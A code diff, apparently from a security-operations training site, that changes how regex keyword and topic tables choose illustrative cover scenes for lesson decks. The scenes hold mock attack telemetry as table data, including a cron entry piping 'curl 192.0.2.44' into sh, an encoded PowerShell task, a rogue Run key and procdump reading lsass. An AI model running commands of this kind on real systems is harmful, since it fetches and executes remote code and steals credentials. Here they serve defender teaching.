@@ -283,7 +283,7 @@ const KEYWORD: [RegExp, Scene][] = [
   [/kerberos|kerberoast|as-rep|golden|silver|dcsync|pass-the|ntlm|authentication/i, ticketFlow],
   [/credential dumping|lsass|ntds/i, tableScene("Sysmon · EventID 10 (ProcessAccess)", ["Time", "SourceImage", "TargetImage", "Access"], [66, 160, 330, 470], [["09:12:01", "svchost.exe", "lsass.exe", "0x1000"], ["09:12:44", "rundll32.exe", "lsass.exe", "0x1010"], ["09:13:02", "MsMpEng.exe", "lsass.exe", "0x1000"], ["09:14:10", "procdump64.exe", "lsass.exe", "0x1fffff"]], 1)],
   [/scheduled task|cron/i, tableScene("schtasks /query /v · crontab -l", ["Task", "Trigger", "Run As", "Action"], [66, 220, 320, 410], [["GoogleUpdateTask", "daily 09:00", "SYSTEM", "GoogleUpdate.exe"], ["OneDrive Standalone", "logon", "user", "OneDriveSetup.exe"], ["MicrosoftEdgeUpd", "every 5 min", "SYSTEM", "powershell -enc JAB..."], ["www-data cron", "*/5 * * * *", "www-data", "curl 192.0.2.44 | sh"]], 2)],
-  [/registry/i, tableScene("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", ["Name", "Type", "Data"], [66, 210, 300], [["OneDrive", "REG_SZ", "\"C:\\Program Files\\OneDrive.exe\""], ["SecurityHealth", "REG_EXPAND_SZ", "%windir%\\SecurityHealth.exe"], ["Updater", "REG_SZ", "rundll32 %APPDATA%\\svc\\up.dll,Start"], ["Teams", "REG_SZ", "\"%LOCALAPPDATA%\\Teams\\Update.exe\""]], 2)],
+  [/registry|run key|usb|trojan persistence/i, tableScene("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", ["Name", "Type", "Data"], [66, 210, 300], [["OneDrive", "REG_SZ", "\"C:\\Program Files\\OneDrive.exe\""], ["SecurityHealth", "REG_EXPAND_SZ", "%windir%\\SecurityHealth.exe"], ["Updater", "REG_SZ", "rundll32 %APPDATA%\\svc\\up.dll,Start"], ["Teams", "REG_SZ", "\"%LOCALAPPDATA%\\Teams\\Update.exe\""]], 2)],
   [/services/i, tableScene("services · sc query", ["Service", "Start", "Account", "BinaryPath"], [66, 200, 270, 390], [["Spooler", "auto", "LocalSystem", "spoolsv.exe"], ["WinDefend", "auto", "LocalSystem", "MsMpEng.exe"], ["UpdSvcX", "auto", "LocalSystem", "C:\\Users\\Public\\u.exe"], ["Dnscache", "auto", "NetworkSvc", "svchost.exe -k"]], 2)],
   [/lolbin|live response|real time response/i, terminal],
   [/ransomware/i, fileList("\\\\SRV-FS01\\finance$", [["Q3-budget.xlsx.locked", "2.1 MB", "03:14", "renamed"], ["payroll.csv.locked", "640 KB", "03:14", "renamed"], ["README-RESTORE.txt", "2 KB", "03:15", "ransom note"], ["contracts.pdf.locked", "4.8 MB", "03:15", "renamed"], ["board-deck.pptx.locked", "9.3 MB", "03:15", "renamed"]], 2)],
@@ -334,28 +334,37 @@ const TOPIC: Record<string, [Scene, string]> = {
   "Social Engineering": [socialScene, "#f472b6"],
 };
 /** Keyword fallback for a topic not in the table (new decks). */
-function sceneFor(topic: string, title: string): [Scene, string] {
-  const accent = (TOPIC[topic] ?? TOPIC["SOC Fundamentals"])[1];
+/** A topic guessed from free text (scenario titles + summaries have no topic field). */
+const GUESS: [RegExp, string][] = [
+  [/prompt|llm|ai|copilot|chatbot|mcp|model/i, "AI & LLM Security"],
+  [/ot|ics|scada|plc|modbus/i, "OT/ICS Security"],
+  [/insider|departing|leaver/i, "Insider Threat"],
+  [/ransom/i, "Malware Analysis"],
+  [/phish|email|mailbox|inbox|bec|invoice/i, "Email Security"],
+  [/aws|azure|gcp|s3|cloud|kubernetes|k8s|iam|oauth|saas|okta|entra|m365|sharepoint/i, "Cloud Security"],
+  [/kerberos|active directory|domain|dcsync|golden|ntlm|ldap|lateral|admin/i, "Active Directory"],
+  [/web|sql|xss|waf|api|log4|deseriali/i, "Web Security"],
+  [/dns|vpn|firewall|network|scan|beacon|c2|exfil/i, "Networking"],
+  [/malware|trojan|loader|stealer|macro|payload/i, "Malware Analysis"],
+  [/brute|password|credential|mfa|sign-in|login/i, "Identity & Access"],
+  [/endpoint|edr|powershell|process|lolbin|windows|linux/i, "Windows & Endpoint"],
+];
+function sceneFor(topic: string, title: string, context = ""): [Scene, string] {
+  // Scene keywords read the TITLE only (a summary saying "no lateral movement" must not pick the lateral scene);
+  // the summary only helps guess the topic.
+  const t = `${topic} ${title} ${context}`;
+  const known = TOPIC[topic] ? topic : (GUESS.find(([re]) => re.test(t))?.[1] ?? "SOC Fundamentals");
+  const accent = TOPIC[known][1];
   for (const [re, scene] of KEYWORD) if (re.test(title)) return [scene, accent];
-  if (TOPIC[topic]) return TOPIC[topic];
-  const t = `${topic} ${title}`.toLowerCase();
-  if (/network|firewall|dns|protocol|vpn/.test(t)) return TOPIC["Networking"];
-  if (/cloud|aws|azure|gcp|kubernetes/.test(t)) return TOPIC["Cloud Security"];
-  if (/malware|ransom/.test(t)) return TOPIC["Malware Analysis"];
-  if (/log|siem|splunk|sentinel|qradar/.test(t)) return TOPIC["SIEM"];
-  if (/identity|kerberos|active directory|entra|okta/.test(t)) return TOPIC["Active Directory"];
-  if (/email|phish/.test(t)) return TOPIC["Email Security"];
-  if (/forensic|memory|evtx/.test(t)) return TOPIC["Digital Forensics"];
-  if (/endpoint|edr|windows|process/.test(t)) return TOPIC["Windows & Endpoint"];
-  return TOPIC["SOC Fundamentals"];
+  return TOPIC[known];
 }
 
 const cache = new Map<string, string>();
 /** `url("data:image/svg+xml,...")` cover for a lesson deck. */
-export function socCover(slug: string, topic: string, title = ""): string {
+export function socCover(slug: string, topic: string, title = "", context = ""): string {
   const key = `${slug}|${topic}`;
   const hit = cache.get(key); if (hit) return hit;
-  const [scene, accent] = sceneFor(topic, title);
+  const [scene, accent] = sceneFor(topic, title, context);
   const uri = `url("data:image/svg+xml,${encodeURIComponent(frame(accent, scene(slug, accent), slug))}")`;
   cache.set(key, uri);
   return uri;
